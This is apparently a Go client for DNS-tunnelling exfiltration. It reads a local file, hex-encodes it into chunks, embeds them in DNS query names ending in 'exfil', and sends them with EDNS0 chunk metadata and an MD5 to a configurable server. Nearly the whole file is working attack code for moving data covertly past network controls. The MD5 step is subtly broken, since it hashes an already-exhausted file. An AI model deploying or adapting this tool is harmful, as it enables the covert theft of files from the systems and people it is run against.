package client

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"

	"github.com/miekg/dns"
)

const (
	START_CHUNK_NUM = 65001
	END_CHUNK_NUM   = 65002
	TOTAL_CHUNKS    = 65003
	MD5_OF_FILE     = 65004
)

type Client struct {
	server string
	port   string
	debug  bool
}

func NewClient(server string, port string, debug bool) *Client {
	return &Client{server: server, port: port, debug: debug}
}

func (c *Client) SendFile(file string) error {
	hexSegments := make([]string, 0)
	f, err := os.Open(file)
	if err != nil {
		return err
	}

	fi, err := f.Stat()
	if err != nil {
		return err
	}
	if c.debug {
		fmt.Println("File size: ", fi.Size())
	}

	chunkByteSize := 31 // will convert to 62 hex bytes in domain segment

	for i := int64(0); i <= fi.Size()/int64(chunkByteSize); i++ {
		if c.debug {
			fmt.Printf("[%v] ", i)
		}
		b := make([]byte, chunkByteSize)
		n, err := f.Read(b)
		if err != nil {
			if c.debug {
				fmt.Println()
			}
			return err
		}
		if n < chunkByteSize {
			b = b[:n]
		}
		hexEncodedChunk := hex.EncodeToString(b)
		hexSegments = append(hexSegments, hexEncodedChunk)
		if c.debug {
			fmt.Printf("size=%v bytes, hex=%v\n", n, hexEncodedChunk)
		}
	}

	segmentCount := 1
	startChunk := 0
	dnsRequestDomain := ""
	dnsClient := new(dns.Client)

	totalChunks := &dns.EDNS0_LOCAL{Code: TOTAL_CHUNKS, Data: []byte(fmt.Sprintf("%d", len(hexSegments)))}

	for _, s := range hexSegments {
		dnsRequestDomain += s + "."
		if segmentCount%3 == 0 || segmentCount == len(hexSegments) {
			dnsRequestDomain += "exfil"
			// make the dns request here
			if c.debug {
				fmt.Println(dnsRequestDomain)
			}
			m := new(dns.Msg)
			m.SetQuestion(dnsRequestDomain+".", dns.TypeA)
			opt := &dns.OPT{}
			opt.Hdr.Name = "."
			opt.Hdr.Rrtype = dns.TypeOPT

			startChunkNum := &dns.EDNS0_LOCAL{Code: START_CHUNK_NUM, Data: []byte(fmt.Sprintf("%d", startChunk))}
			endChunkNum := &dns.EDNS0_LOCAL{Code: END_CHUNK_NUM, Data: []byte(fmt.Sprintf("%d", segmentCount))}

			opt.Option = append(opt.Option, startChunkNum)
			opt.Option = append(opt.Option, endChunkNum)
			opt.Option = append(opt.Option, totalChunks)
			if segmentCount == len(hexSegments) {
				// add the md5 in the last packet
				hash := md5.New()
				_, err := io.Copy(hash, f)
				if err != nil {
					return err
				}
				fmt.Printf("%x\n", hash.Sum(nil))
				md5OfFile := &dns.EDNS0_LOCAL{Code: MD5_OF_FILE, Data: []byte(fmt.Sprintf("%x", hash.Sum(nil)))}
				opt.Option = append(opt.Option, md5OfFile)

			}
			m.Extra = append(m.Extra, opt)
			r, _, err := dnsClient.Exchange(m, net.JoinHostPort(c.server, c.port))
			if err != nil {
				return err
			}
			if c.debug {
				fmt.Printf("ok, response len (%v)\n", len(r.Answer))
			}

			dnsRequestDomain = "" // reset it
			startChunk = segmentCount
		}
		segmentCount++
	}

	return nil
}
